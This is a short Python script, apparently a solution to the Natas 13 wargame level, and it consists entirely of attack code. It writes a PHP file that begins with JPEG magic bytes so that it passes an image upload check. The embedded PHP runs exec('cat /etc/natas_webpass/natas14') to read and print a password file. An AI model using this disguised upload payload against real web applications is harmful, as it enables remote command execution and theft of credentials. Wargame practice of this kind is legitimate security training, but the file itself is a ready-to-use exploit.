file = open('natas13-new.php', 'wb')
file.write(b'\xFF\xD8\xFF\xE0' + b'<?php echo "Here is the Password of Natas13: ";echo exec("cat /etc/natas_webpass/natas14");?>')
file.close()
